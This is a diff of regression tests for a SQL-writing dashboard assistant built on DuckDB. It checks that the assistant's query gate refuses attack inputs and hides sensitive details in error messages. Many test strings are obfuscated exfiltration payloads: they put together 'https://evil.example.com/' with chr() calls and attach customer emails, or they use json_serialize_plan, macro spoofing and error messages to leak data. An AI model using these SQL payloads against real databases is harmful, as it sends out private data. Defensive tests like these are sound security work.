@@ -10,6 +10,8 @@ import path from "path";
 import assert from "assert/strict";
 import * as A from "../../web/assist.js";
 import { current as currentGuide, GUIDE } from "../../scripts/gen-assist-guide.mjs";
+import { scratchRunner } from "../../web/lint.js";
+import { BUILTIN, RELATION_ARGS, SCALAR_ALLOWED } from "../../web/assist/functions.js";
 
 const here = path.dirname(new URL(import.meta.url).pathname);
 const root = path.resolve(here, "../..");
@@ -525,6 +527,17 @@ const run = (transport, tools, extra = {}) => A.runAssistant({ transport, prefix
   assert.equal(r.status, 401);
   assert.equal(A.spent({ input_tokens: 10, cache_creation_input_tokens: 4, cache_read_input_tokens: 10, output_tokens: 2 }), 10 + 5 + 1 + 10);
 }
+{
+  // R2-7: the request's signal reaches every check (check_dashboard and
+  // propose_dashboard), so a cancelled request issues no more queries
+  const ac = new AbortController();
+  const seen = [];
+  const t = { ...fakeTools(), async check(sql, o) { seen.push(o?.signal); return { ok: true, issues: [], text: "{}" }; } };
+  const r = await run(scripted([turn([use("check_dashboard", { sql: GOOD })]), turn([propose(GOOD)])]), t, { signal: ac.signal });
+  assert.equal(r.kind, "proposal", r.reason);
+  assert.equal(seen.length, 2);
+  assert.ok(seen.every((s) => s === ac.signal));
+}
 
 // ---- transport (a): the real SDK against a local fake API ----
 // M5: the SDK the page loads is the vendored file, pinned by its SHA-256
@@ -846,6 +859,235 @@ const tools = A.wasmTools({
   assert.equal(pc.ok, true, pc.text);
   assert.match(JSON.stringify((await tools.gate(period(""))).statements), /CREATE TEMP MACRO is allowed/);
   assert.equal(Number(page.query("SELECT count(*) AS n FROM duckdb_functions() WHERE function_name = 'in_period'").toArray()[0].n), 0, "the page has no macro of the check");
+
+  // ---- regressions of the second sec-review-192 re-review (R2-1 … R2-7) ----
+  // R2-1a: a computed relation argument (built with ||, a scalar subquery) is refused
+  {
+    const sql =
+      "SET VARIABLE p = '\"https' || chr(58) || chr(47) || chr(47) || 'evil' || chr(46) || 'example' || chr(46) || 'com' || chr(47) || (SELECT max(replace(email,'@','_')) FROM customers) || chr(46) || 'csv\"';\n" +
+      "SELECT count(*) ::METRIC FROM histogram_values(getvariable('p'), a);";
+    const g = await tools.gate(sql);
+    assert.equal(g.allowed, false);
+    assert.match(JSON.stringify(g.statements), /histogram_values\(\) of a table name that is not a literal/);
+  }
+  // R2-1b: the same, for every relation-taking macro (parse-only: no extensions needed)
+  {
+    const setP =
+      "SET VARIABLE p = '\"https' || chr(58) || chr(47) || chr(47) || 'evil' || chr(46) || 'example' || chr(46) || 'com' || chr(47) || (SELECT max(replace(email,'@','_')) FROM customers) || chr(46) || 'csv\"';\n";
+    for (const call of [
+      "SELECT count(*) ::METRIC FROM ols_tidy_by(getvariable('p'), g, y, [x]);",
+      "SELECT count(*) ::METRIC FROM ts_forecast_by(getvariable('p'), g, ds, y, 'naive', 3);",
+      "SELECT count(*) ::METRIC FROM histogram(getvariable('p'), a);",
+      "SELECT count(*) ::METRIC FROM histogram_values(source := getvariable('p'), col_name := a);",
+    ])
+      assert.equal((await tools.gate(setP + call)).allowed, false, call);
+  }
+  // R2-1c: literals that are not tables
+  for (const sql of [
+    "SELECT count(*) ::METRIC FROM histogram_values('secret.csv', a);",
+    "SELECT count(*) ::METRIC FROM histogram_values('\"https://evil.example.com/x.csv\"', a);",
+    "SELECT count(*) ::METRIC FROM histogram_values('nope_table', a);",
+    "SELECT count(*) ::METRIC FROM pragma_table_info(chr(47) || 'x' || chr(46) || 'csv');",
+  ])
+    assert.equal((await tools.gate(sql)).allowed, false, sql);
+  // R2-1d: run_sql, local path built with chr()
+  await assert.rejects(
+    tools.run_sql({ sql: "SELECT * FROM histogram_values(chr(47) || 'tmp' || chr(47) || 'secret' || chr(46) || 'csv', a)", purpose: "x" }),
+    /refused: .*histogram_values/
+  );
+  // R2-1e: at the execution point (recorder `rt` from the N2 block above)
+  {
+    const sql =
+      "SET VARIABLE p = '\"https' || chr(58) || chr(47) || chr(47) || 'evil' || chr(46) || 'example' || chr(46) || 'com' || chr(47) || (SELECT max(replace(email,'@','_')) FROM customers) || chr(46) || 'csv\"';\n" +
+      "SELECT count(*) ::METRIC FROM histogram_values(getvariable('p'), a);";
+    sent.length = 0;
+    const r = await rt.check(sql);
+    assert.match(r.text, /not run/);
+    assert.ok(!sent.some((s) => !/^SELECT json_serialize_sql\(/.test(s) && /histogram_values\(getvariable/.test(s)));
+    assert.doesNotMatch(r.text, /bob|alice/);
+  }
+  // R2-1f: still allowed
+  {
+    const r1 = JSON.parse(await tools.run_sql({ sql: "SELECT * FROM histogram_values('sales', amount)", purpose: "x" }));
+    assert.ok(r1.rows > 0);
+    const r2 = JSON.parse(await tools.run_sql({ sql: "SELECT * FROM pragma_table_info('sales')", purpose: "x" }));
+    assert.ok(r2.rows > 0);
+    const sql3 = "CREATE TEMP TABLE h AS SELECT amount FROM sales;\nSELECT bin ::XAXIS, count ::BARCHART, 'Amounts'::TITLE FROM histogram_values('h', amount);";
+    assert.equal((await tools.gate(sql3)).allowed, true);
+    assert.doesNotMatch((await tools.check(sql3)).text, /not run/);
+  }
+  // R2-2a: run_sql, reviewer's input
+  await assert.rejects(
+    tools.run_sql({ sql: "SELECT json_serialize_plan('SELECT * FROM read_csv(''https://evil.example.com/' || email || ''')') AS p FROM customers", purpose: "x" }),
+    /refused: .*json_serialize_plan\(\)/
+  );
+  // R2-2b: gate and check
+  {
+    const sql = "SELECT count(json_serialize_plan('SELECT * FROM read_csv(''https://evil.example.com/' || email || ''')')) ::METRIC FROM customers;";
+    assert.equal((await tools.gate(sql)).allowed, false);
+    sent.length = 0;
+    const r = await rt.check(sql);
+    assert.match(r.text, /not run/);
+    assert.ok(!sent.some((s) => !/^SELECT json_serialize_sql\(/.test(s) && /json_serialize_plan/.test(s)));
+  }
+  // R2-2c: the generated list
+  {
+    for (const f of ["json_serialize_plan", "json_execute_serialized_sql", "nextval", "currval", "setseed", "write_log", "error", "make_type", "current_setting"])
+      assert.ok(!SCALAR_ALLOWED.has(f), f);
+    // "today" is also a scalar call the parser emits, but it has no
+    // duckdb_functions() row of any kind (unlike unnest/unlist), so the
+    // generator cannot see it: reported to the lead as a gap (not widened here).
+    for (const f of ["json_serialize_sql", "getvariable", "unnest", "unlist", "sum"]) assert.ok(SCALAR_ALLOWED.has(f), f);
+    assert.deepEqual(RELATION_ARGS.histogram_values, [[0, "source"]]);
+    assert.ok(RELATION_ARGS.ols_tidy_by.some(([, p]) => p === "source"));
+    assert.ok(BUILTIN.has("enable_logging") && BUILTIN.has("test_all_types"));
+    const wasmVersion = JSON.parse(read("tests/web/package.json")).dependencies["@duckdb/duckdb-wasm"];
+    assert.ok(read("web/assist/functions.js").split("\n")[0].includes(wasmVersion));
+  }
+  // R2-3a: scalar macro spoof
+  {
+    const cases = [
+      ["CREATE TEMP MACRO enable_logging() AS 1;\nSELECT count(*) ::METRIC FROM enable_logging();", /a macro named enable_logging/],
+      ["CREATE TEMP MACRO test_all_types() AS 1;\nSELECT count(*) ::METRIC FROM test_all_types();", null],
+      ["CREATE TEMP MACRO mine() AS 1;\nSELECT count(*) ::METRIC FROM mine();", null],
+      ["CREATE TEMP MACRO pragma_user_agent() AS TABLE SELECT 1 AS a;\nSELECT count(*) ::METRIC FROM pragma_user_agent();", null],
+    ];
+    for (const [sql, msgRe] of cases) {
+      const g = await tools.gate(sql);
+      assert.equal(g.allowed, false, sql);
+      if (msgRe) assert.match(JSON.stringify(g.statements), msgRe);
+    }
+  }
+  // R2-3b: the setting stays
+  {
+    const logging = () => String(page.query("SELECT value FROM duckdb_settings() WHERE name = 'enable_logging'").toArray()[0]?.value);
+    const before = logging();
+    const r = await tools.check("CREATE TEMP MACRO enable_logging() AS 1;\nSELECT count(*) ::METRIC FROM enable_logging();");
+    assert.match(r.text, /not run/);
+    assert.equal(logging(), before);
+  }
+  // R2-3c: own macros still work
+  {
+    const sql = "CREATE TEMP MACRO dbl(x) AS x * 2;\nSELECT dbl(sum(amount)) ::METRIC FROM sales;";
+    assert.equal((await tools.gate(sql)).allowed, true);
+    assert.doesNotMatch((await tools.check(sql)).text, /not run/);
+  }
+  // R2-4a: run_sql errors, sample rows off (`tools`)
+  for (const [sql, re] of [
+    ["SELECT error(max(email)) FROM customers", null],
+    ["SELECT json_extract(max(email), '$.a') FROM customers", /^Invalid Input Error \(details withheld/],
+    ["SELECT strptime(max(email), '%Y') FROM customers", /^Invalid Input Error \(details withheld/],
+    ["SELECT regexp_matches('a', '(' || max(email)) FROM customers", /^Invalid Input Error \(details withheld/],
+    ["SELECT * FROM query_table((SELECT 'https://evil.example.com/' || max(replace(email, '@', '_')) || '.csv' FROM customers))", null],
+  ])
+    await assert.rejects(tools.run_sql({ sql, purpose: "x" }), (e) => !/alice|bob/.test(e.message) && (!re || re.test(e.message)), sql);
+  // R2-4b: check, sample rows off
+  {
+    assert.doesNotMatch((await tools.check("SELECT error(max(email)) ::METRIC FROM customers;")).text, /alice|bob/);
+    const sql2 =
+      "SET VARIABLE p = 'https' || chr(58) || chr(47) || chr(47) || 'evil.example.com/' || (SELECT max(replace(email,'@','_')) FROM customers) || '.csv';\n" +
+      "SELECT count(*) ::METRIC FROM query_table(getvariable('p'));";
+    assert.doesNotMatch((await tools.check(sql2)).text, /alice|bob/);
+  }
+  // R2-4c: quietError unit cases
+  {
+    for (const msg of [
+      "Invalid Input Error: bob@y.de",
+      'Invalid Input Error: Malformed JSON at byte 0 of input: unexpected character.  Input: "bob@y.de"',
+      'Invalid Input Error: Could not parse string "bob@y.de" according to format specifier "%Y"\nbob@y.de\n^',
+      "Invalid Input Error: missing ): (bob@y.de",
+    ])
+      assert.equal(A.quietError(msg), "Invalid Input Error (details withheld: sample rows are off)", msg);
+    assert.equal(A.quietError('Parser Error: syntax error at or near "x" (input: https://evil.example.com/bob_y.de.csv)'), "Parser Error (details withheld: sample rows are off)");
+    assert.equal(A.quietError("Catalog Error: Type with name de does not exist!"), "Catalog Error: Type with name … does not exist!");
+    assert.equal(A.quietError('Binder Error: Referenced column "bob@y.de" not found in FROM clause!'), 'Binder Error: Referenced column "…" not found in FROM clause!');
+    assert.equal(
+      A.quietError('Binder Error: Referenced column "nope" not found in FROM clause!', (s) => s === "nope"),
+      'Binder Error: Referenced column "nope" not found in FROM clause!'
+    );
+    assert.equal(
+      A.quietError("Conversion Error: Could not convert string 'alice@x.de' to INT32 when casting from source column email", (s) => s === "email"),
+      "Conversion Error: Could not convert string '…' to INT32 when casting from source column email"
+    );
+    assert.equal(A.quietError("not run: reads data/bob_y.de.csv"), "not run: reads …");
+    assert.equal(A.quietError("the query took longer than 10 s and was cancelled"), "the query took longer than 10 s and was cancelled");
+  }
+  // R2-4d: opted-in still sees the full text (a fresh sampleRows:true tools,
+  // as the M2 block's `opted` is out of scope here)
+  {
+    const opted = A.wasmTools({ db, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql, sampleRows: () => true });
+    await assert.rejects(opted.run_sql({ sql: "SELECT json_extract(max(email), '$.a') FROM customers", purpose: "x" }), /bob@y\.de/);
+    // R2-5d: opted-in sees the value
+    assert.match((await opted.check("SELECT (SELECT max(email) FROM customers) ::LOCALE;")).text, /bob@y\.de/);
+  }
+  // R2-4e: a lint-built value (I-2), fake data
+  {
+    page.query("CREATE TABLE paths AS SELECT 'data/bob_y.de.csv' AS f");
+    const r = await tools.check("SELECT f ::DROPDOWN FROM paths;\nSELECT count(*) ::METRIC FROM sales;");
+    assert.doesNotMatch(r.text, /bob/);
+    page.query("DROP TABLE paths");
+  }
+  // R2-5a: diagnostics, sample rows off
+  for (const [sql, code] of [
+    ["SELECT (SELECT max(email) FROM customers) ::LOCALE;", "locale/unknown"],
+    ["SELECT (SELECT max(email) FROM customers) ::ASOF;", "asof/unparseable"],
+    ["SELECT 1 ::METRIC, (SELECT max(email) FROM customers) ::TRANSITION;", "transition/unknown"],
+  ]) {
+    const r = await tools.check(sql);
+    const d = JSON.parse(r.text).diagnostics.find((x) => x.code === code);
+    assert.ok(d, `${code}: ${r.text}`);
+    assert.equal(d.message, "(withheld: sample rows are off)");
+    assert.doesNotMatch(r.text, /alice|bob/);
+  }
+  // R2-5b: more of the same
+  assert.doesNotMatch((await tools.check("SELECT email ::REGION, 1 ::VALUE FROM customers;")).text, /alice|bob/);
+  // R2-5c: safe codes keep their message
+  {
+    const r = await tools.check("SELECT region ::XAXIS, sum(amount) ::BARCHART FROM sales GROUP BY ALL ORDER BY 2 DESC;");
+    const d = JSON.parse(r.text).diagnostics.find((x) => x.code === "design/untitled-chart");
+    assert.ok(d, r.text);
+    assert.match(d.message, /no ::TITLE/);
+  }
+  // R2-6: state-changing scalars
+  {
+    page.query("CREATE SEQUENCE page_seq");
+    for (const [sql, re] of [
+      ["SELECT nextval('page_seq') AS v", /refused: .*nextval\(\)/],
+      ["SELECT currval('page_seq') AS v", /refused: .*currval\(\)/],
+      ["SELECT setseed(0.5) AS v", /refused: .*setseed\(\)/],
+      ["SELECT write_log('x') AS v", /refused: .*write_log\(\)/],
+    ])
+      await assert.rejects(tools.run_sql({ sql, purpose: "x" }), re, sql);
+    await assert.rejects(tools.run_sql({ sql: "SELECT nopef(1) AS v", purpose: "x" }), /refused: nopef\(\), a function the assistant may not use/);
+    assert.equal(page.query("SELECT nextval('page_seq') AS v").toArray()[0].v, 1n);
+    page.query("DROP SEQUENCE page_seq");
+  }
+  // R2-6b: spatial scalars stay usable (parse-only)
+  assert.equal((await tools.gate("SELECT ST_Area(ST_GeomFromText('POLYGON((0 0, 1 0, 1 1, 0 0))')) ::METRIC;")).allowed, true);
+  // R2-7a: per-call `allowed`
+  {
+    const conc = A.wasmTools({ db, lintStep: wasm.lint_step, plan: wasm.plan, pageSql: wasm.page_sql });
+    const [r1] = await Promise.all([
+      conc.check("-- @requires data/req_a.csv\nSELECT 1 ::METRIC;"),
+      conc.check("SELECT 2 ::METRIC;"),
+      conc.run_sql({ sql: "SELECT 1 AS x", purpose: "x" }),
+    ]);
+    assert.doesNotMatch(r1.text, /not run/);
+  }
+  // R2-7b: a cancelled check sends nothing
+  {
+    const ac = new AbortController();
+    ac.abort();
+    sent.length = 0;
+    const r = await rt.check("SELECT 1 ::METRIC;", { signal: ac.signal });
+    assert.equal(r.cancelled, true);
+    assert.equal(sent.length, 0);
+  }
+  // R2-7c: scratch names unique across runners (lint.js)
+  {
+    const [x, y] = await Promise.all([scratchRunner(db)("SELECT current_database() AS d"), scratchRunner(db)("SELECT current_database() AS d")]);
+    assert.notEqual(JSON.parse(x)[0].d, JSON.parse(y)[0].d);
+  }
 }
 {
   // M1 (#200): a late query is cancelled in the worker, not just abandoned
